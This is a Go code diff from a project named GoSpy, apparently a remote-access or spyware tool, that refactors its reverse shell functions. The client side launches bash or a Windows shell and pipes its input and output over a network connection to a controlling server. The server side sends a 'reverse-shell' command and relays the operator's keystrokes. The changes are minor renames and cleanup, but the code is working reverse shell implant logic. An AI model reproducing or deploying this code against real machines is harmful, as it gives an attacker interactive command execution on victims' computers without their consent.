@@ -4,7 +4,7 @@ import (
 	"bufio"
 	"fmt"
 	"github.com/psidex/GoSpy/internal/comms"
-	"github.com/psidex/GoSpy/internal/server"
+	"github.com/psidex/GoSpy/internal/server/conman"
 	"log"
 	"net"
 	"os"
@@ -16,6 +16,8 @@ import (
 // initiateReverseShellOut initiates a reverse shell with the given connection.
 func initiateReverseShellOut(c comms.Connection) {
 	defer c.Close()
+	defer log.Println("Exited reverse shell function")
+
 	shellString := "/bin/bash"
 
 	if runtime.GOOS == "windows" {
@@ -26,7 +28,6 @@ func initiateReverseShellOut(c comms.Connection) {
 		}
 	}
 
-	defer log.Println("Exited reverse shell function")
 	cmd := exec.Command(shellString)
 
 	cmdOut, err := cmd.StdoutPipe()
@@ -39,8 +40,8 @@ func initiateReverseShellOut(c comms.Connection) {
 		return
 	}
 
-	cmdOutErr := comms.BridgeReaderToConnection(cmdOut, c)
-	cmdInErr := comms.BridgeConnectionToWriter(c, cmdIn)
+	cmdOutErr := comms.CopyToConnection(cmdOut, c)
+	cmdInErr := comms.CopyFromConnection(c, cmdIn)
 
 	err = cmd.Start()
 	if err != nil {
@@ -70,21 +71,22 @@ func ReverseShellReply(c comms.Connection) error {
 		reverseShellConn = comms.NewPlainConnection(conn)
 	}
 
-	// If the shell proc hangs and the server quits the session, the client shouldn't hang as well.
+	// If the shell proc hangs and the server quits the shell session, the client shouldn't hang as well.
 	go initiateReverseShellOut(reverseShellConn)
 	return nil
 }
 
-func ReverseShellSend(man server.ConMan) (err error) {
+func ReverseShellSend(man conman.ConMan) (err error) {
 	err = man.CmdCon.SendBytes([]byte("reverse-shell"))
 	if err != nil {
 		return err
 	}
 
 	reverseShellConnection := man.WaitForNewConnection()
+	defer reverseShellConnection.Close()
 
 	fmt.Println("Type `exit` to leave the shell at any time")
-	_ = comms.BridgeConnectionToWriter(reverseShellConnection, os.Stdout)
+	_ = comms.CopyFromConnection(reverseShellConnection, os.Stdout)
 
 	for {
 		reader := bufio.NewReader(os.Stdin)
@@ -103,6 +105,5 @@ func ReverseShellSend(man server.ConMan) (err error) {
 		}
 	}
 
-	_ = reverseShellConnection.Close()
 	return nil
 }
